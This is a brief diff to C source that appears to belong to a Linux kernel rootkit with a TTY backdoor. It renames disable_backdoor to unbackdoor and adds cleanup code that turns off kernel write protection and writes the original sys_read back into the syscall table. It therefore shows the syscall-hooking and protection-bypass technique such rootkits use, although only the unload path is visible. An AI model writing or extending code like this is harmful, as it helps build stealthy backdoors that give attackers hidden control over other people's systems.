@@ -36,7 +36,7 @@ backdoor_tty(void)
 }
 
 void
-disable_backdoor(void)
+unbackdoor(void)
 {
     if (tty) {
         if (current_receive_buf2) {
@@ -48,6 +48,13 @@ disable_backdoor(void)
         }
 
         tty = NULL;
+    }
+
+    if (sys_read) {
+        while (atomic_read(&read_count) > 0);
+        disable_protection();
+        sys_calls[__NR_read] = (void *)sys_read;
+        enable_protection();
     }
 }
 
